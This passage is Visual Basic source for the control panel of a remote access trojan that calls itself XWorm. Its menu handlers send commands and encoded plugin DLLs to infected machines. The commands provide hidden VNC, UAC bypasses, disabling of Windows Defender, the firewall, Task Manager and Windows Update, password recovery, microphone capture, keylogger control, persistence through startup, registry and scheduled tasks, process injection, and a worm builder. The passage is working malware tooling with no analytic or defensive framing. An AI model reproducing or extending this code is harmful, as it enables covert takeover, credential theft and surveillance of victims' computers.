            Dim str3 As String = Interaction.InputBox("Set Port", "[ HVNC Server ]", "8000")

            If (str3.Length = 0) Then
            Else
                Dim pxx As Process = Process.Start(AppDomain.CurrentDomain.BaseDirectory + "Tools\HVNC-Server.exe", str3)
            End If
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try

    End Sub

    Private Sub RunToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles RunToolStripMenuItem1.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim str3 As String = Interaction.InputBox("Set Host:Port", "[ HVNC Client ] " + "Selected [" & Lv1.SelectedItems.Count & "]", "127.0.0.1:8000")
            If (str3.Length = 0) Then
            Else

                Try
                    Dim B As Byte() = SB("HVNC" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\HVNC.dll")) & Settings.SPL & str3.Split(":")(0) & Settings.SPL & str3.Split(":")(1))
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                Catch ex As Exception
                    MessageBox.Show(ex.Message)
                End Try
            End If
        End If
    End Sub

    Private Sub NgrokToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NgrokToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("ngrok")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub StopToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles StopToolStripMenuItem1.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Settings.SPL & "taskkill.exe /im ngrok.exe /f")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub StartToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles StartToolStripMenuItem1.Click
        If Lv1.SelectedItems.Count > 0 Then
            If Lv1.SelectedItems.Count > 1 Then
                MessageBox.Show("This Works With Only One Connection!")
            Else
                If Lv1.Items(Lv1.FocusedItem.Index).SubItems(8).Text = "True" Then

                    Dim B As Byte() = SB("hrdp")
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next

                Else
                    MessageBox.Show("This Feature Requires UAC Permissions!")
                End If
            End If
        End If
    End Sub

    Private Sub Method2ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Method2ToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("admin" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\UACBypass.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub Method1ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Method1ToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("admin" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Cmstp-Bypass.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub RecoveryManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RecoveryManagerToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("PassR")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub EnableToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EnableToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("regfuc" & Settings.SPL & "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr" & Settings.SPL & "0")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub DisableToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DisableToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("regfuc" & Settings.SPL & "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr" & Settings.SPL & "1")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next


        End If
    End Sub

    Private Sub EnableToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles EnableToolStripMenuItem1.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Settings.SPL & "netsh advfirewall set allprofiles state on")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub DisableToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles DisableToolStripMenuItem1.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Settings.SPL & "netsh advfirewall set allprofiles state off")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next


        End If
    End Sub

    Private Sub EnableToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles EnableToolStripMenuItem2.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("regfuc" & Settings.SPL & "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA" & Settings.SPL & "1")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub DisableToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles DisableToolStripMenuItem2.Click

        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("regfuc" & Settings.SPL & "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA" & Settings.SPL & "0")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub DisableWindowsDefenderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DisableWindowsDefenderToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("WDPL" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\DisableWD.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub
    Private Sub StopWindowsUpdateToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StopWindowsUpdateToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Settings.SPL & "cmd.exe /c net stop wuauserv && sc config wuauserv start= disabled")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ToolStripMenuItem5_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem5.Click
        Binder.Show()
    End Sub

    Private Sub CreateWormToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CreateWormToolStripMenuItem.Click
        Dim f As New Builder
        Helper.aes_function()
        f.StartPosition = FormStartPosition.CenterParent
        f.ShowDialog()
    End Sub

    Private Sub AboutToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem1.Click
        Dim f As New About
        f.StartPosition = FormStartPosition.CenterParent
        f.ShowDialog()
    End Sub

    Private Sub HTADownloaderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HTADownloaderToolStripMenuItem.Click
        Downloader.Show()
    End Sub

    Private Sub InformationToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InformationToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim B As Byte() = SB("getinfo")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If
    End Sub

    Private Sub EnableToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles EnableToolStripMenuItem3.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("regfuc" & Settings.SPL & "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools" & Settings.SPL & "0")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub DisableToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles DisableToolStripMenuItem3.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("regfuc" & Settings.SPL & "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools" & Settings.SPL & "1")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next


        End If
    End Sub

    Private Sub EnableToolStripMenuItem4_Click(sender As Object, e As EventArgs) Handles EnableToolStripMenuItem4.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("BScreen" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\BlankScreen.dll")) & Settings.SPL & "0")
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub DisableToolStripMenuItem4_Click(sender As Object, e As EventArgs) Handles DisableToolStripMenuItem4.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("BScreen" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\BlankScreen.dll")) & Settings.SPL & "1")
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub RunPEToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RunPEToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim f As New RunPE
            f.StartPosition = FormStartPosition.CenterParent
            f.ShowDialog()
        End If
    End Sub

    Private Sub Net35ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Net35ToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("NETINS" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\NetInstall.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub


    Private Sub RunAsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RunAsToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("admin" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\AskUAC.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ComputerdefaultsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ComputerdefaultsToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("admin" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Computerdefaults.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub WDExclusionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles WDExclusionToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("WDPL" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\WDExclusion.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub StartUpToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartUpToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("InsW" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Install.dll")) & Settings.SPL & "1")
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub RegistryToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RegistryToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("InsW" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Install.dll")) & Settings.SPL & "2")
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub SchtasksToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SchtasksToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("InsW" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Install.dll")) & Settings.SPL & "3")
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem2.Click
        IconChanger.Show()
    End Sub

    Private Sub ToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem3.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("TCPV")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub MicrophoneToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MicrophoneToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("MICL")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub ChatToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ChatToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("Xchat")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub PasTimeToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasTimeToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("JustFun" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Pastime.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub


    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Try
            NotifyIcon1?.Dispose()
            Environment.Exit(0)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub SystemSoundToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SystemSoundToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("Wsound")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub



    Private Sub BlockClientsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BlockClientsToolStripMenuItem.Click
        Dim f As New BlockClients
        f.StartPosition = FormStartPosition.CenterParent
        f.ShowDialog()
    End Sub


    Private Sub ToolStripStatusLabel4_Click(sender As Object, e As EventArgs) Handles ToolStripStatusLabel4.Click
        If ToolStripStatusLabel4.Text = "[ Logs ]" Then
            ToolStripStatusLabel4.Text = "[ Clients ]"
            Lv1.Visible = False
            Lv2.Visible = True
        Else
            ToolStripStatusLabel4.Text = "[ Logs ]"
            Lv1.Visible = True
            Lv2.Visible = False
        End If
    End Sub

    Private Sub ClearToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClearToolStripMenuItem.Click
        Lv2.Items.Clear()
    End Sub

    Private Sub IPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles IPToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim out As String
            Dim F As New BlockClients

            Try
                For Each XX In Strings.Split(My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Block", Nothing), (","))
                    If Not XX = Nothing Then
                        If Not F.ListBox1.Items.Contains(XX) Then
                            F.ListBox1.Items.Add(XX)
                        End If
                    End If
                Next
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try


            Try
                out = Nothing
                For Each C As ListViewItem In Lv1.SelectedItems
                    If Not F.ListBox1.Items.Contains(C.SubItems(0).Text) Then
                        F.ListBox1.Items.Add(C.SubItems(0).Text)
                    End If
                Next

                F.StartPosition = FormStartPosition.CenterParent
                F.ShowDialog()

            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try

        End If
    End Sub

    Private Sub IDToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles IDToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim out As String
            Dim F As New BlockClients

            Try
                For Each XX In Strings.Split(My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Block", Nothing), (","))
                    If Not XX = Nothing Then
                        If Not F.ListBox1.Items.Contains(XX) Then
                            F.ListBox1.Items.Add(XX)
                        End If
                    End If
                Next
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try


            Try
                out = Nothing
                For Each C As ListViewItem In Lv1.SelectedItems
                    If Not F.ListBox1.Items.Contains(C.SubItems(2).Text) Then
                        F.ListBox1.Items.Add(C.SubItems(2).Text)
                    End If
                Next

                F.StartPosition = FormStartPosition.CenterParent
                F.ShowDialog()

            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try

        End If
    End Sub

    Private Sub NoteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NoteToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim str3 As String = Interaction.InputBox("Enter Your Note", "Note")


            Dim B As Byte() = SB("SNote" & Settings.SPL & str3)
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next


            Try
                For Each C As ListViewItem In Lv1.SelectedItems
                    If str3 = Nothing Then
                        C.SubItems(11).Text = "Nothing"
                    Else
                        C.SubItems(11).Text = str3
                    End If
                Next
                Lv1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try
        End If
    End Sub

    Private Sub StopToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles StopToolStripMenuItem2.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("closeKL")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub Form1_Activated(sender As Object, e As EventArgs) Handles Me.Activated
        If trans Then Me.Opacity = 1.0
    End Sub

    Private Sub Form1_Deactivate(sender As Object, e As EventArgs) Handles Me.Deactivate
        Me.Opacity = 0.95
    End Sub

    Private Sub MONSTERMCVPNToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MONSTERMCVPNToolStripMenuItem.Click
        Process.Start("https://youtu.be/_vXGczDt_S4")
    End Sub
End Class
